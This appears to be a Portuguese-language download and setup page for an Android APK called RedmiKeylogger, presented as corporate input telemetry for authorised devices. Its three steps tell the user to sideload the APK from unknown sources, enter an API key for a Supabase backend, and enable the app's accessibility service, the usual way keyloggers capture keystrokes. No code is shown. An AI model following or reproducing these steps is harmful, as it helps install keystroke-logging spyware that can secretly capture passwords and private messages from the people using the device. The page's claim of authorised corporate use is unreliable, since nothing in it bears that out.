Instalação Segura do RedmiKeylogger

Distribuição oficial do pacote APK para conformidade e telemetria de input em dispositivos corporativos autorizados.

Instalar Agora Download Manual (APK)

Requer Android 7.0+ (API 24+) • Permissão de fontes desconhecidas no Chrome

⚙️ Como Configurar o Aplicativo

Siga os 3 passos após a instalação do pacote APK no dispositivo:

01

Instalar o APK

Toque no botão de instalação acima. Se solicitado pelo Android, autorize a instalação de apps pela fonte do seu navegador.

02

Configurar a API_KEY

Abra o app RedmiKeylogger, localize o campo API Key na tela principal, insira a chave corporativa fornecida pela TI e toque em Salvar Configuração.
Authorization: Bearer [API_KEY]

03

Ativar Acessibilidade

Toque em Abrir Configurações de Acessibilidade, encontre o RedmiKeylogger na lista e habilite o serviço. O status no app mudará para ATIVO.

⚠️
Atenção de Segurança e Privacidade: O preenchimento da API_KEY correta é indispensável para que as requisições de telemetria sejam autenticadas pelo Supabase/Backend. Sem a chave, os eventos serão rejeitados com erro 401/403 Unauthorized.
